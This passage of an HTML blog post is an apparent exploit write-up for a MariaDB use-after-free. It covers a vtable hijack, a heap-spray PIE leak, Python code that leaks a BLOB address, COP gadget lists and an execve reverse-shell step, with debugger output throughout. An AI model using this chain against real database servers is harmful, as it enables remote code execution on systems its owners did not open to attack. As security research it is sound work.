+      <p>This script generates our query. Note <span class='monospace'>decls</span> and <span class='monospace'>open</span>, which declares our 33 REFCURSORs (one more than 32, triggering the dynamic reallocation and the stale REFCURSOR reference later on). Then, we spray a bunch of chunks to reclaim our old chunk, and finally trigger the vtable dispatch (now overwritten) by executing a <span class='monospace'>FETCH</span> query. Some handwaving aside, I'm going to show you what happens when we overwrite this chunk with all <span class='monospace'>0x41</span>. First we place a breakpoint on the function that properly handles the <span class='monospace'>FETCH</span> stuff, which is called <span class='monospace'>Materialized_cursor::fetch</span>.</p>
+
+      <pre><code>[*<span style="color:#6639ba;">#0</span>] <span style="color:#cf222e;">0x7fc572555a82</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#1</span>] <span style="color:#cf222e;">0x7fc57254961c</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#2</span>] <span style="color:#cf222e;">0x7fc5725d0dce</span> &lt;poll+0x1e&gt;
+[ <span style="color:#6639ba;">#3</span>] <span style="color:#cf222e;">0x55b2c9fdca7a</span> &lt;handle_connections_sockets()+0x2da&gt;
+[ <span style="color:#6639ba;">#4</span>] <span style="color:#cf222e;">0x55b2c9fe3b87</span> &lt;mysqld_main(int, char**)+0x3167&gt;
+[ <span style="color:#6639ba;">#5</span>] <span style="color:#cf222e;">0x7fc5724d3601</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#6</span>] <span style="color:#cf222e;">0x7fc5724d3718</span> &lt;__libc_start_main+0x88&gt;
+[ <span style="color:#6639ba;">#7</span>] <span style="color:#cf222e;">0x55b2c9fc06b5</span> &lt;_start+0x25&gt;
+<span style="color:#0550ae;">---------------------------------------------------------------------------------------------------------------------------------------------------
+</span><span style="font-weight:bold;color:#0550ae;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>break Materialized_cursor::fetch
+Breakpoint 1 at <span style="color:#0550ae;">0x55b2ca0c809d</span></code></pre>
+
+      <p>After some manual stepping forward, we can see the exact set of instructions that perform our dereference & indirect vtable call.</p>
+
+      <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>x/10i $rip-0x20
+   <span style="color:#6639ba;">cmp    </span>DWORD PTR [<span style="color:#cf222e;">rdi</span>+<span style="color:#0550ae;">0x910</span>],<span style="color:#cf222e;">esi</span>
+   <span style="color:#6639ba;">jb     </span><span style="color:#0550ae;">0x55b2ca0c8106</span> &lt;<span style="color:olive;">Materialized_cursor::fetch(unsigned long)</span>+118&gt;
+   <span style="color:#6639ba;">jmp    </span><span style="color:#0550ae;">0x55b2ca0c8160</span> &lt;<span style="color:olive;">Materialized_cursor::fetch(unsigned long)</span>+208&gt;
+   <span style="color:#6639ba;">nop    </span>DWORD PTR [<span style="color:#cf222e;">rax</span>+<span style="color:#cf222e;">rax</span>*<span style="color:#0550ae;">1</span>+<span style="color:#0550ae;">0x0</span>]
+   <span style="color:#6639ba;">mov    </span><span style="color:#cf222e;">rdi</span>,QWORD PTR [<span style="color:#cf222e;">rbx</span>+<span style="color:#0550ae;">0x20</span>]
+   <span style="color:#6639ba;">lea    </span><span style="color:#cf222e;">rsi</span>,[<span style="color:#cf222e;">rbx</span>+<span style="color:#0550ae;">0x8f0</span>]
+   <span style="color:#6639ba;">mov    </span><span style="color:#cf222e;">rax</span>,QWORD PTR [<span style="color:#cf222e;">rdi</span>]
+=&gt; <span style="color:#6639ba;">call   </span>QWORD PTR [<span style="color:#cf222e;">rax</span>]</code></pre>
+
+      <p>Note the <span class='monospace'>call QWORD PTR [rax]</span>, the instruction that does the vtable dispatch. Finally, we can see a clear segfault in a bountiful field of 0x41s:</p>
+
+      <pre><code><span style="color:#0550ae;">----------------------------------------------------------------------------------------------------- memory access: $rax = 0x4141414141414141 ----
+</span><span style="color:#cf222e;">[!]</span> Cannot access memory at address 0x4141414141414141
+<span style="color:#0550ae;">-------------------------------------------------------------------------------------------------------------------------- arguments (guessed) ----
+</span>QWORD PTR [rax] (
+   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x000077c514fd8650</span>  -&gt;  0x4141414141414141 <span style="color:olive;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>,
+   <span style="color:#0550ae;">$rsi</span> = <span style="color:#6639ba;">0x000077c535f3e800</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3e960</span>  -&gt;  <span style="color:#6639ba;">0x000055b2cb34aaf0</span> &lt;end_of_list&gt;  -&gt;  [loop detected],
+   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x000077c5355daac0</span>  -&gt;  <span style="color:#ffffff;">0x000055b2cb0b0310</span>  -&gt;  <span style="color:#cf222e;">0x000055b2ca061410</span>  -&gt;  0x5d058d48fa1e0ff3,
+   <span style="color:#0550ae;">$rcx</span> = <span style="color:#6639ba;">0x000077c535f3cba0</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3cfa0</span>  -&gt;  0x0000000000000001,
+   <span style="color:#0550ae;">$r8</span> = <span style="color:#6639ba;">0x000077c535f3cba0</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3cfa0</span>  -&gt;  0x0000000000000001,
+   <span style="color:#0550ae;">$r9</span> = 0x0000000000000000,
+)</code></pre>
+
+      <p>So now, we have clear control over RIP. All that remains is for us to get a PIE leak, and write a suitable chain for us to get a shell. Note, however, that because this is a vtable dispatch, we need to <i>know</i> the address of this potential exploitation chain, wherever it may lie. That will be a problem for later. Now, back to the PIE leak...</p>
+
+      <h2>PIE leak</h2>
+
+      <p>Let's note how the SYS_REFCURSOR chunk & vtable dispatch actually looks during ordinary, non-exploitative execution. We can place the same breakpoint and inspect the same instruction, the indirect call that does the vtable dispatch:</p>
+
+      <pre><code>0x55b0fbc66df0 &lt;sp_cursor::Select_fetch_into_spvars::send_data(List&lt;Item&gt;&amp;)&gt; (
+   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x00007747aae4ee00</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccd16b8</span> &lt;vtable for sp_cursor::Select_fetch_into_spvars+0x10&gt;  -&gt;  <span style="color:#cf222e;">0x000055b0fbc66df0</span> &lt;sp_cursor::Sele
+ct_fetch_into_spvars::send_data(List&lt;Item&gt;&amp;)&gt;  -&gt;  0xf9894855fa1e0ff3,
+   <span style="color:#0550ae;">$rsi</span> = <span style="color:#6639ba;">0x00007747d9f8cdc0</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8cf20</span>  -&gt;  <span style="color:#6639ba;">0x000055b0fcf47af0</span> &lt;end_of_list&gt;  -&gt;  [loop detected],
+   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x00007747d9ef0740</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccad310</span>  -&gt;  <span style="color:#cf222e;">0x000055b0fbc5e410</span>  -&gt;  0x5d058d48fa1e0ff3,
+   <span style="color:#0550ae;">$rcx</span> = <span style="color:#6639ba;">0x00007747d9f8b160</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8b560</span>  -&gt;  0x0000000000000001,
+   <span style="color:#0550ae;">$r8</span> = <span style="color:#6639ba;">0x00007747d9f8b160</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8b560</span>  -&gt;  0x0000000000000001,
+   <span style="color:#0550ae;">$r9</span> = 0x0000000000000000,
+)</code></pre>
+
+      <p>Note the referenced value in rdi here (you might have to scroll a bit...). The REFCURSOR chunk itself contains PIE pointers in the form of the vtable pointers we initially overwrote. These PIE pointers are in the middle of the chunk somewhere. Is it possible to leak these vtable pointers? Recall the conditions for our PIE leak --- we need a controllable chunk of a known size that we can allocate at will, and we need to be able to allocate this suitably near (and after, in memory) our malformed multipolygon header. Furthermore, this REFCURSOR chunk is big enough that it falls into the unsorted bins, and not tcache, which means that we can perform remaindering.</p>
+
+      <p>It is indeed possible to reclaim a freed SYS_REFCURSOR chunk partially, inserting our inflated (1e300) point pairs such that they fill precisely the memory before our vtable pointer. So, our UAF bug actually gives us the exact mechanisms possible for the PIE leak: we allocate our malformed polygon header chunk, and then allocate our SYS_REFCURSOR chunk beneath it, free it with the realloc(), and then populate the memory before the vtable pointer with 1e300 doubles by doing a very strategic realloc.</p>
+
+      <p>In case that is unclear, here is a GIF:</p>
+
+      <div class='mdb-image-cont'>
+        <div class='img-wrap'>
+        <img src='/assets/mdb.gif' style='width:90%'><br>
+        </div>
+        <i>Potential chunk layout</i>
+      </div>
+
+      <p>It stands to mention that getting this specific chunk layout requires a decent amount of heap feng shui. This took a lot of thinking, and a lot of false starts. Inevitably, what I ended up doing was finding the specific size of both the multipolygon chunk and the re-alloc'd REFCURSOR chunk. With this, I can do a heap spray to completely empty the unsorted / large / small bins for allocations of those sizes, which -- at this time -- would be uncontrollable allocations that we cannot predict. Then, to ensure that the two chunks are close to each other, I would spam a whole lot of those allocations of those sizes (now taken from the top chunk, so they are likelier to be contiguous) and then free them to freshly populate the bins with chunks I know are near one another.</p>
+
+      <p>Afterwards, you just do the allocations again and see what happens. It turns out the last multipolygon-sized chunk you empty will end up being reclaimed as expected, but MariaDB claims another REFCURSOR-sized chunk (for what, I don't know) before it allocates our chunk properly. So, it turns out that the heap feng shui is actually quite simple. We just spray the heap, allocate two chunks of our provided sizes (these are now sure to be close to one another, again as they are serviced from the top chunk) and then free another sacrificial chunk for MariaDB to take first. Doing so results in our intended chunk layout, and we can perform our PIE leaks as stated above.</p>
+
+      <p>This is a bit unreliable of a process, but thankfully we can just keep doing it over and over again (the heap spray, the three chunk allocation & free, and the multipolygon and SYS_REFCURSOR) allocation until we hit our PIE leak. We can verify that we have leaked PIE correctly because the last 3 nibbles are invariant up to ASLR (I hope if you've gotten this far, you already know this).</p>
+
+      <p>Here's how the PIE leak actually looks:</p>
+
+      <pre><code>  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (1.3278924084869121e+177,)
+leaked address: 0x267c170784df4e57
+recovered 2773116791614819927 0x267c170784df4e57
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#00ffff;">SQL ▶</span> BEGIN NOT ATOMIC
+  DECLARE c0 SYS_REFCURSOR;
+  DECLARE c1 SYS_REFCURSOR;
+  DECLARE c2 SYS_REFCURSOR;
+  DECLARE c3 SYS_REFCURSOR;
+  DECLARE c4 SYS_REFCURSOR;
+  D<span style="color:#8a8a8a;"> ... (411883 chars)</span>
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (0.0,)
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#00ffff;">SQL ▶</span> BEGIN NOT ATOMIC
+  DECLARE c0 SYS_REFCURSOR;
+  DECLARE c1 SYS_REFCURSOR;
+  DECLARE c2 SYS_REFCURSOR;
+  DECLARE c3 SYS_REFCURSOR;
+  DECLARE c4 SYS_REFCURSOR;
+  D<span style="color:#8a8a8a;"> ... (411883 chars)</span>
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (2.3275097575403548e-10,)
+leaked address: 0x55b0fccd16b8
+recovered 94218643904184 0x55b0fccd16b8
+[!] leaked PIE! 0x55b0fb3b0000<span style="color:white;background-color:black;"> </span></code></pre>
+
+      <p>Note the failed attepmt at the beginning --- surely, some garbage must have gotten in the way of our allocation or the allocations did not happen as expected. This failure thankfully does not matter, because our leak does eventually end up succeeding.</p>
+
+      <h2>COP chain</h2>
+
+      <p>We are almost done. We have RIP control, but this comes in the form of a vtable override --- we would need to override this vtable pointer with a pointer to any gadget we wish to use, not the gadget itself. This means that we need another leak! We must write our chain, whatever it is, in some location, and then leak the address to that location. Fortunately we can do this quite simply with MariaDB's BLOB entries and the multipolygon OOB leak.</p>
+
+      <p>We can write our chain in a BLOB entry, and then leak the pointer to that entry (this works because BLOB entries are stored <i>as heap pointers</i> inside the table itself. We can do this with the following code, which adds our corrupted header before our BLOB entry.</p>
+
+      <pre><code><span style="color:#6e7781;">   14   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;DROP TABLE IF EXISTS lk&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   13   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;CREATE TEMPORARY TABLE lk(a VARBINARY(74), b VARBINARY(66), c BLOB)&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   12   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;INSERT INTO lk VALUES (0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">,0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">,0x</span><span style="color:#0550ae;">%s</span><span style="color:#0a3069;">)&quot;</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   11   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">           </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">_GEOM74</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">bytes</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">b</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> payload</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()))</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   10   </span><span style="color:#0550ae;">│</span><span style="color:#6e7781;">---│</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    9   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">print</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">'[!] spraying blob-sized chunks (this might take a while...)'</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    8   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">0x200</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    7   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#6639ba;">spray_blob_chunks</span><span style="color:#0550ae;">())</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    6   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    5   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    4   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">input</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">'[!] leaking payload'</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    3   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    2   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   r </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">fetchone</span><span style="color:#0550ae;">()</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    1   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   payload_address </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">_recover</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">r</span><span style="color:#0550ae;">[</span><span style="color:#ff966c;">0</span><span style="color:#0550ae;">])</span><span style="color:#1f2328;"></span></code></pre>
+
+      <p>This leaks our BLOB entry as intended. A small caveat --- due to the nature of these BLOB entries as dynamically allocated buffers on the heap, it seems that at some point in time, this chunk will invariably get freed and whatever payload we write in it will become corrupted. This, thankfully, is only a little bit annoying, because the chunk gets reclaimed by other, smaller chunks and is not overwritten in its entirety. The payload data does get corrupted, but only slightly, and the bytes that get corrupted are (to my eye) deterministic. We can simply place the payload in a patchwork fashion, by strategically placing it in the bytes that do not get corrupted.</p>
+
+      <p>All that aside though, this vtable override is a little bit weak. We can only redirect the control flow once (instead of multiple times, like in ROP), and we still need sufficient control over the registers to do anything meaningful. How do we convert this single indirect call into multiple indirect calls?</p>
+
+      <p>Introducing: call-oriented programming, or COP! Take a look at some of these gadgets:</p>
+
+      <pre><code>0x0000000000d636b1 : xor r15d, r15d ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0xe0]
+0x0000000000b50a4e : xor r15d, r15d ; mov rax, qword ptr [rdi] ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x550]
+0x0000000000cc628f : xor r15d, r15d ; mov rax, qword ptr [rdi] ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0xe0]
+0x0000000000a03ad1 : xor r15d, r15d ; mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi] ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x270]
+0x00000000010c5d75 : xor r8d, r8d ; add edx, edx ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x150]
+0x0000000000c5c73a : xor r8d, r8d ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x150]
+0x0000000000ebd54b : xor r8d, r8d ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x1f8]
+0x0000000000a0e9ed : xor r8d, r8d ; <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">call qword</span> ptr [rax + 0x340]</code></pre>
+
+      <p>Note that at this juncture, we have control over the memory <i>surrounding</i> RAX, and the memory <i>surrounding</i> RDI too. RDI points to our reclaimed chunk, whose data we can specifically control, and RAX points to wherever we redirect our payload to. This means that we have control over the values at, say, [rax + 0x10], or [rax + 0x300], as well as [rdi + 0x100].</p>
+
+      <p>This means we can now chain these call gadgets by placing them at specific offsets from the initial payload. We'll build a <span class='monospace'>ret2syscall</span> chain -- it seemed to me to be the easiest option, given our lack of libc leaks (I'm still not sure how you would leak stack or even libc here). Note that our control over the registers will be a bit more limited. Let's look at how we might control <span class='monospace'>rsi</span>.</p>
+
+      <pre><code>0x0000000000873099 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 0x20] ; call qword ptr [rax + 0x10]
+0x00000000011772dd <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 0xa0] ; call qword ptr [rax + 0xc8]
+0x000000000117721d <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 0xa8] ; call qword ptr [rax + 0xc8]
+0x00000000008734fc <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; add rdx, r12 ; call qword ptr [rax + 0x338]
+0x0000000000c645f1 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; call qword ptr [rax + 0x198]
+0x000000000091da8a <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; call qword ptr [rax + 0x218]
+0x00000000011c73d2 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; call qword ptr [rax + 0x338]
+0x0000000000a7ccdd <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; call qword ptr [rax + 8]
+0x0000000000c82ee0 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; lea rdx, [rsi + r12] ; call qword ptr [r8 + 0x210]
+0x0000000000c6a5fb <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; mov qword ptr [rbp - 0x68], rdi ; call qword ptr [rax + 0x198]
+0x0000000000dde191 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#cf222e;">: mov rsi, qword ptr [rdi</span> + 8] ; mov rcx, qword ptr [rbp + 0x10] ; call qword ptr [rax + 0x338]</code></pre>
+
+      <p>This naturally gives us <span class='monospace'>rsi</span> control. Note, however, that we would need to control <span class='monospace'>rdx</span>, <span class='monospace'>rdi</span>, and eventually <span class='monospace'>rax</span> itself. I'll gloss over this COP chain, because a lot of it is by-the-numbers , but there are some more interesting constraint problems in trying to build this chain that took me about 3 hours of experimenting and debugging. Not a lot of gadgets exist that give such direct control of the registers, we often have to build the registers in multiple steps: i.e., moving a value into <span class='monospace'>r14</span>, and then moving the <span class='monospace'>r14</span> value into <span class='monospace'>rdi</span>.</p>
+
+      <p>Further note that because this is a remotely exploited program we need to set up a proper <span class='monospace'>execve()</span> call that triggers a reverse shell. This is not too bad, but it does mean we need to place <span class='monospace'>/bin/sh</span> strings in memory (we can simply do this in our BLOB entry) and set up <span class='monospace'>rcx</span> accordingly. Because reverse shell invocations are long and we do not have much space in our <span class='monospace'>BLOB</span> entry that does not get corrupted, this means that we have a length limit on the shell command we pass to <span class='monospace'>execve()</span>.</p>
+
+      <p>Below is a view of the <span class='monospace'>execve()</span> invocation firing.</p>
+
+      <pre><code><span style="color:#0550ae;">[+]</span> Detected syscall (arch:X86, mode:64)
+    <span style="color:olive;">execve(const char __user* filename, const char __user* const __user* argv, const char __user* const __user* envp)</span>
+    <span style="color:#0550ae;">Parameter            Register             Value</span>
+    RET                  $rax                 -
+    NR                   $rax                 0x3b
+    filename             $rdi                 <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:olive;">'/bin/bash'</span>
+    argv                 $rsi                 <span style="color:#6639ba;">0x000077afd6e4ee6b</span>  -&gt;  <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:olive;">'/bin/bash'</span>
+    envp                 $rdx                 0x0000000000000000
+<span style="color:#0550ae;">--------------------------------------------------------------------------------------------------------------------------------------------------------------- threads (shown
+:4 / all:14) ----
+</span>[ <span style="color:#6639ba;">Thread Id:1, tid:1</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[ <span style="color:#6639ba;">Thread Id:2, tid:145</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[ <span style="color:#6639ba;">Thread Id:3, tid:144</span>] Name: &quot;signal_handler&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[*<span style="color:#6639ba;">Thread Id:12, tid:158</span>] Name: &quot;one_connection&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+<span style="color:#0550ae;">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------ trace ----
+</span>[*<span style="color:#6639ba;">#0</span>] <span style="color:#cf222e;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#1</span>] <span style="color:#cf222e;">0x55bee1be0eab</span> &lt;sp_cursor::fetch(THD*, Virtual_tmp_table*, List&lt;sp_fetch_target&gt;*, bool)+0xbb&gt;
+[ <span style="color:#6639ba;">#2</span>] <span style="color:#cf222e;">0x55bee1edf766</span> &lt;sp_instr_cfetch_by_ref::execute(THD*, unsigned int*)+0x66&gt;
+[ <span style="color:#6639ba;">#3</span>] <span style="color:#cf222e;">0x55bee1bda7d2</span> &lt;sp_head::execute(THD*, bool)+0x9f2&gt;
+[ <span style="color:#6639ba;">#4</span>] <span style="color:#cf222e;">0x55bee1bdc133</span> &lt;sp_head::execute_procedure(THD*, List&lt;Item&gt;*)+0xa83&gt;
+[ <span style="color:#6639ba;">#5</span>] <span style="color:#cf222e;">0x55bee1ca0667</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#6</span>] <span style="color:#cf222e;">0x55bee1cb4b97</span> &lt;mysql_execute_command(THD*, bool)+0x3887&gt;
+[ <span style="color:#6639ba;">#7</span>] <span style="color:#cf222e;">0x55bee1cb7599</span> &lt;mysql_parse(THD*, char*, unsigned int, Parser_state*)+0x1c9&gt;
+[ <span style="color:#6639ba;">#8</span>] <span style="color:#cf222e;">0x55bee1ca3f57</span> &lt;dispatch_command(enum_server_command, THD*, char*, unsigned int, bool)+0x16b7&gt;
+[ <span style="color:#6639ba;">#9</span>] <span style="color:#cf222e;">0x55bee1ca5c17</span> &lt;do_command(THD*, bool)+0x1e7&gt;</code></pre>
+
+      <p>With that our work is done.</p>
+
+      <h2>Improvements</h2>
+
+      <p>I did specify that this chain involves significant improvements over v12's simple POC. While I imagine an agent would've also made it sufficiently reliable if you just keep /goaling for it, I'm still proud of what I was able to do. In summary, the heap feng shui to align the two chunks in the original exploit was completely nonexistent, and relied on fixed offsets and a known heap state (from a fresh instance) to land the PIE leak accurately. It seems that there was some more hallucinated offset-guessing by the agent in the exploit...</p>
+
+      <p>Furthermore, the exploit also assumes the payload chunk's offset. It places the payload inside the reclaimed chunk, and assumes a fixed offset from the heap arena's base (which obviously would not hold up if the heap were used prior to exploitation). My version leaks the pointer to the payload chunk, so all is well and good.</p>
+
+      <p>These improvements may seem small, but they are steps in making the exploit more reliable against a proper system. The process of trying to develop an exploit for a serious program, one with many bells and whistles, drips and drabs, unpredictable behaviours and frustratingly arcane, seemingly-nonsensical heap operations was a seriously enjoyable and educational challenge for me anyways. After working with so many abstracted, simple pwn challenges, it was fun to try and think about actual targets, with actual stakes. Flesh and blood instead of cardboard outlines at a gun range.</p>
+
+      <p>I encourage other people to try this sort of stuff. It's very fun!</p>
+
+      <a href="https://www.youtube.com/watch?v=reSOp1domrU">reward for getting to the end of this post</a>
       </main>
   </body>
 
@@ -240,5 +463,6 @@ leaked address: 0x774fd3fe7738</code></pre>
     }
   </style>
 </html>
+
 
 
